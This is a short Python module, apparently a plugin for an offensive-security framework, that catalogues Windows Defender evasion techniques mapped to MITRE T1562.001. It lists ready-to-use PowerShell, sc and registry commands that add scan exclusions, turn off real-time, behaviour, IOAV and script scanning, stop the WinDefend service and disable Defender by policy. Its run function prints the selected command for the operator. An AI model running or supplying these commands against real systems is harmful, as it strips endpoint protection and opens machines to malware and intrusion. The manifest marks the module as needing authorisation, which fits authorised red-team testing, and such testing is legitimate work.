"""Windows Defender evasion  -  disable, exclude, or tamper with Defender."""
import sys
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.evasion.defender_disable.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["security_product_disable"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1562.001"],
}

TECHNIQUES = {
    "add_exclusion": 'Add-MpPreference -ExclusionPath "{path}"',
    "disable_realtime": "Set-MpPreference -DisableRealtimeMonitoring $true",
    "disable_behavior": "Set-MpPreference -DisableBehaviorMonitoring $true",
    "disable_ioav": "Set-MpPreference -DisableIOAVProtection $true",
    "disable_all": (
        "Set-MpPreference -DisableRealtimeMonitoring $true;"
        "Set-MpPreference -DisableBehaviorMonitoring $true;"
        "Set-MpPreference -DisableIOAVProtection $true;"
        "Set-MpPreference -DisableScriptScanning $true"
    ),
    "tamper_service": 'sc config WinDefend start=disabled; net stop WinDefend',
    "gpo_disable": (
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" '
        '/v DisableAntiSpyware /t REG_DWORD /d 1 /f'
    ),
}


def run(args: Any) -> int:
    technique = getattr(args, "defender_tech", "add_exclusion")
    path = getattr(args, "exclusion_path", "C:\\Windows\\Temp")

    cmd = TECHNIQUES.get(technique, TECHNIQUES["add_exclusion"])
    cmd = cmd.format(path=path)

    print(f"[*] Defender evasion ({technique}):")
    print(f"  {cmd}")
    print("\n[!] Requires local admin (most techniques)")
    print("[*] Available: {}".format(", ".join(TECHNIQUES.keys())))
    return 0
